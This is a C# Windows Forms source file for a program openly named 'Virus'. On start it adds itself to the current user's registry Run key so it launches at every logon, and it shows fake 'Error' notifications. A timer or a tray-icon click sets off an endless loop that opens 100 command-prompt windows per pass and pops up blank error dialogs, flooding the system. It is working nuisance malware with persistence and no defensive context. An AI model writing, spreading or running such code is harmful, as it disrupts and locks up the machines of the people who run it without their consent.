using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Virus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        static void SetStartup()
        {
            string appName = "Virus";
            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            rk.SetValue(appName, exePath);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SetStartup();

            notifyIcon1.Icon = SystemIcons.Application;
            notifyIcon1.BalloonTipIcon = ToolTipIcon.Error;
            notifyIcon1.BalloonTipTitle = "Error";
            notifyIcon1.BalloonTipText = " ";
            notifyIcon1.ShowBalloonTip(5000);

            timer1.Enabled = false;

        }
        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            timer1_Tick(sender, e);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {

            while (true)
            {
                this.WindowState = FormWindowState.Minimized;

                for (decimal i = 0; i < 100; i++)
                {
                    System.Diagnostics.Process.Start("C:\\Windows\\system32\\cmd.exe");

                }

                MessageBox.Show("                                                                               ", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1);

                this.Activate();

                notifyIcon1.Icon = SystemIcons.Application;
                notifyIcon1.BalloonTipIcon = ToolTipIcon.Error;
                notifyIcon1.BalloonTipTitle = "Error";
                notifyIcon1.BalloonTipText = " ";
                notifyIcon1.ShowBalloonTip(5000);
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {

            timer1.Enabled = true;
            timer1_Tick(sender,  e);

        }
    }
}
